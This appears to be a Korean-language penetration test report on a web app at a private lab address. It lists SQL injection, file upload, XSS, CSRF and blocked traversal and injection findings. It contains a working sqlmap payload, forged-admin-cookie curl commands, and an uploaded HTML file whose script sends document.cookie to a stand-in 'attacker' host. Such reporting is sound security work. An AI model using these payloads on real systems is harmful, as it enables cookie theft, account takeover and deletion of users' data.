# 심화 취약점 탐색 결과

## 테스트 일시
2025-12-11 (2차 탐색)

---

## 1. SQLMap 분석 결과

### 데이터베이스 정보
- **DBMS**: SQLite
- **Injection Type**: Boolean-based blind
- **취약 파라미터**: username (POST /login)

### SQLMap 페이로드
```
username=admin%' AND CASE WHEN 4475=4475 THEN 4475 ELSE JSON(CHAR(113,108,105,66)) END AND 'xBlj%'='xBlj
```

---

## 2. 파일 업로드 취약점 심화

### 발견된 문제점
파일 업로드 시 **확장자 제한이 전혀 없음**

### 테스트된 파일 유형

| 파일 | Content-Type | 위험도 |
|------|--------------|--------|
| xss.svg | image/svg+xml | High (XSS 실행) |
| shell.gif | image/gif | Medium |
| test.ejs | application/octet-stream | Medium |
| test.sh | application/octet-stream | Low |
| **steal.html** | **text/html** | **Critical** |

### Critical: HTML 파일 업로드
```bash
# 쿠키 탈취 HTML 파일 업로드
echo '<!DOCTYPE html><html><body>
<script>new Image().src="http://attacker/steal?c="+document.cookie;</script>
</body></html>' > steal.html

curl -X POST -H "Cookie: user=admin; isAdmin=true; user_id=1" \
  -F "profile_image=@steal.html" \
  "http://192.168.0.28:3000/profile/upload"
```

**결과**: `/uploads/steal.html`로 접근 가능, `Content-Type: text/html`로 제공되어 브라우저에서 JavaScript 실행

### 공격 시나리오
1. 공격자가 악성 HTML 파일 업로드
2. 피해자에게 `/uploads/steal.html` 링크 전송
3. 피해자가 링크 클릭 시 쿠키 탈취

---

## 3. 사용자 삭제 기능 (CSRF 취약)

### 엔드포인트
`POST /admin/users/{id}/delete`

### 테스트
```bash
curl -X POST -H "Cookie: user=admin; isAdmin=true; user_id=1" \
  "http://192.168.0.28:3000/admin/users/30/delete"
```

### 결과
- CSRF 토큰 없이 사용자 삭제 가능
- 관리자 권한만 있으면 누구나 삭제 실행 가능

---

## 4. 추가 테스트 결과

### Path Traversal
- `/uploads/../../../etc/passwd` - **차단됨**
- URL 인코딩 우회 - **차단됨**
- 이중 슬래시 우회 - **차단됨**

### SSTI (Server-Side Template Injection)
- EJS 템플릿 (`<%= 7*7 %>`) - **실행 안됨** (그대로 출력)
- Jinja2 스타일 (`{{7*7}}`) - **실행 안됨**

### Command Injection
- 상품명에 `; id` 삽입 - **실행 안됨**
- 별도 명령 실행 포인트 없음

### 민감 파일 노출
- `/.env` - 404
- `/package.json` - 404
- `/.git/config` - 404

---

## 5. 새로 발견된 취약점 요약

| # | 취약점 | 위험도 | 설명 |
|---|--------|--------|------|
| 8 | Unrestricted File Upload | Critical | 모든 파일 확장자 업로드 가능 |
| 9 | HTML File Upload XSS | Critical | HTML 파일이 text/html로 제공 |
| 10 | CSRF on User Delete | High | 토큰 없이 사용자 삭제 가능 |
| 11 | SQLite Boolean-blind SQLi | High | SQLMap으로 확인된 blind injection |

---

## 6. 총 발견 취약점 현황

### Critical (5개)
1. SQL Injection - 로그인 우회
2. Stored XSS - Q&A 게시판
3. 쿠키 기반 권한 상승
4. **Unrestricted File Upload**
5. **HTML File Upload XSS**

### High (4개)
1. IDOR - 주문 정보 노출
2. SVG 파일 업로드 XSS
3. **CSRF - 사용자 삭제**
4. **SQLite Boolean-blind SQLi**

### Medium (2개)
1. 보안 헤더 누락
2. 서버 정보 노출

---

## 7. 업로드 디렉토리 파일 목록

현재 `/uploads/` 디렉토리에 업로드된 파일:
- xss.svg (SVG XSS)
- shell.gif (GIF 매직바이트 + PHP)
- test.ejs (EJS 템플릿)
- test.sh (쉘 스크립트)
- steal.html (쿠키 탈취 HTML)
